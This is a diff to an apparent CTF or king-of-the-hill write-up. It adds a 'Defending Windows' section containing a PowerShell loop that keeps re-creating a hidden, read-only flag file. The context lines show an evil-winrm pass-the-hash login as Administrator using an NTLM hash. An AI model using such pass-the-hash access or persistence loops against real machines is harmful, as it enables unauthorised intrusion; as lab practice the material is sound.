@@ -28,7 +28,7 @@ There was also trivia questions what would give us points if we answered them co
 
 ---
 
-##  Windows
+## Attacking Windows
 
 To start off with windows i did an nmap scan to see what ports were open. 
 
@@ -115,3 +115,34 @@ NTLM hashes are special, instead of using hashcat to find the admin password you
     evil-winrm -i 10.109.124.214 -u Adminstrator -H 5c5aefbcab1053c010bc9c1cfcc6f95d
     
 <img width="711" height="272" alt="image" src="https://github.com/user-attachments/assets/b7d12dd9-a692-41c1-bb92-4252fd2ab4d0" />
+
+---
+## Defending Windows
+Once I got admin, I had to plant my flag and secure the machine so other hackers couldn't steal it. 
+
+
+    *Evil-WinRM* PS C:\Users\Administrator\Desktop> echo "FLAG-S3X7Q5K8M2T9R4BL" > C:\Users\Administrator\Desktop\flag.txt
+    ------------------------------------
+    $flag = "FLAG-S3X7Q5K8M2T9R4BL"
+    $path = "C:\Users\Administrator\Desktop\flag.txt"
+ 
+    while($true) {
+    # Check if the file content has changed
+    $current = Get-Content $path -ErrorAction SilentlyContinue
+    if ($current -ne $flag) {
+        # If changed/deleted, write it back immediately
+        echo $flag > $path
+        # Lock it (Read-only + Hidden)
+        attrib +r +h $path
+        Write-Host "Flag restored!"
+    }
+    Start-Sleep -Seconds 2
+    }
+---
+## Attacking Linux
+
+---
+## Defending Linux
+
+
+
